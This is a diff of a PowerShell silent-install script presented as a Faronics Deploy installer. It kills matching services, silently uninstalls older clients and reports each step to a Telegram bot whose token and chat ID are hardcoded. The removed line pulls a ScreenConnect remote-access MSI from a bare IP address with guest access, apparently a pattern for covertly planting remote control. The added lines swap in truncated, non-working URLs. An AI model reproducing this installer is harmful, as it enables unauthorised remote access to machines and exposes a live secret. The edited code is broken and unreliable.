@@ -1,6 +1,6 @@
 # ==============================================================================
 # Script Name: install.ps1
-# Description: Fixed Dynamic Silent Installer with Native URI Extraction
+# Description: Universal Dynamic Silent Installer Optimized for Faronics Deploy
 # ==============================================================================
 
 # Force PowerShell output to treat text as UTF-8
@@ -12,7 +12,7 @@ $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
 # 2. APPLICATION CONFIGURATION - PASTE ANY MSI LINK HERE
-$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+$MsiUrl    = "http://50.114.179"
 $TempDir   = "C:\Windows\Temp"
 
 # --- NATIVE URI FILENAME EXTRACTION (No String Splitting) ---
@@ -42,7 +42,7 @@ function Send-TelegramAlert {
             text    = $Message
         } | ConvertTo-Json -Compress -Depth 2
 
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
+        Invoke-RestMethod -Uri "https://telegram.org" `
                           -Method Post `
                           -ContentType "application/json; charset=utf-8" `
                           -Body $Payload -ErrorAction Stop | Out-Null
@@ -54,17 +54,26 @@ function Send-TelegramAlert {
 # --- MILESTONE 1: SCRIPT LAUNCH ---
 Send-TelegramAlert -Message "[🚀] $AppName Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."
 
-# 3. ANTI-1603 CONFLICT CLEANUP (Runs before installation)
+# 3. ANTI-1603 CONFLICT CLEANUP (Fast Registry Sweeper - Bypasses Win32_Product)
 try {
     Write-Output "Stopping any existing background services..."
     Get-Service -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
     Get-Process -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
-    Write-Output "Removing old instances to prevent 1603 errors..."
-    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%$AppName%'" -ErrorAction SilentlyContinue | ForEach-Object {
-        Write-Output "Uninstalling existing client: $($_.Name)"
-        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old client ($($_.Name)) on PC: $Computer"
-        Invoke-CimMethod -InputObject $_ -MethodName "Uninstall" -ErrorAction SilentlyContinue
+    Write-Output "Scanning system registries to remove older conflicting $AppName packages..."
+    # Scans the safe, instant Registry paths instead of querying the WMI engine
+    $RegPaths = @(
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+    )
+    $OldApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
+               Where-Object { $_.DisplayName -like "*$AppName*" -and $_.UninstallString -like "*msiexec*" }
+
+    foreach ($App in $OldApps) {
+        $IdentifyingNumber = $App.PSChildName
+        Write-Output "Uninstalling existing client GUID: $IdentifyingNumber"
+        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old version ($($App.DisplayName)) on PC: $Computer"
+        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $IdentifyingNumber /qn /norestart" -Wait -NoNewWindow
     }
 } catch {
     Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
